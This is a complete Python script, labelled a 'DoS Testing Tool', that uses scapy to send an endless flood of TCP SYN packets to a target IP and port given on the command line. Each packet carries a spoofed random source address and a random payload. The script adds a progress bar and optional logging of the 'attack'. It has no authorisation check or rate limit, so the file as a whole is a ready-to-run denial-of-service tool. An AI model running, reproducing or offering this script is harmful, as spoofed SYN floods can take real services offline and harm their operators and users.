import random
import argparse
import logging
from scapy.all import send, IP, TCP, Raw, RandShort, RandString
from tqdm import tqdm

def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def send_packet(target_ip, target_port, packet_size):
    source_ip = generate_random_ip()
    source_port = RandShort()
    packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags='S') / Raw(load=RandString(packet_size))
    send(packet, verbose=False)

def dos_attack(target_ip, target_port, packet_size, verbose):
    sent_packets = 0
    progress_bar = tqdm(desc="Sending packets", unit="pkt", dynamic_ncols=True)

    try:
        while True:
            send_packet(target_ip, target_port, packet_size)
            sent_packets += 1
            progress_bar.update(1)
            if verbose:
                print(f"Sent packet {sent_packets} to {target_ip}:{target_port} from {generate_random_ip()}:{RandShort()}")
    except KeyboardInterrupt:
        print(f"\nAttack interrupted by user after sending {sent_packets} packets.")
    finally:
        progress_bar.close()

def is_valid_ip(ip):
    try:
        parts = ip.split(".")
        if len(parts) != 4:
            return False
        for part in parts:
            if not 0 <= int(part) <= 255:
                return False
        return True
    except ValueError:
        return False

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DoS Testing Tool')
    parser.add_argument('-t', '--target', required=True, help='IP address of the target')
    parser.add_argument('-p', '--port', type=int, required=True, help='Port number of the target')
    parser.add_argument('-ps', '--packet-size', type=int, default=64, help='Packet size in bytes (default: 64)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-l', '--log', help='Log file to record the attack details')

    args = parser.parse_args()

    if not is_valid_ip(args.target):
        print("Invalid IP address. Please provide a valid IP address.")
        exit(1)

    if not 1 <= args.port <= 65535:
        print("Invalid port number. Please provide a port number between 1 and 65535.")
        exit(1)

    if args.log:
        logging.basicConfig(filename=args.log, level=logging.INFO, format='%(asctime)s - %(message)s')
        logging.info(f"Starting DoS attack on {args.target}:{args.port} with packets of size {args.packet_size}")

    try:
        dos_attack(args.target, args.port, args.packet_size, args.verbose)
        if args.log:
            logging.info(f"Completed DoS attack on {args.target}:{args.port}")
    except KeyboardInterrupt:
        print("\nAttack interrupted by user.")
        if args.log:
            logging.info("DoS attack interrupted by user.")
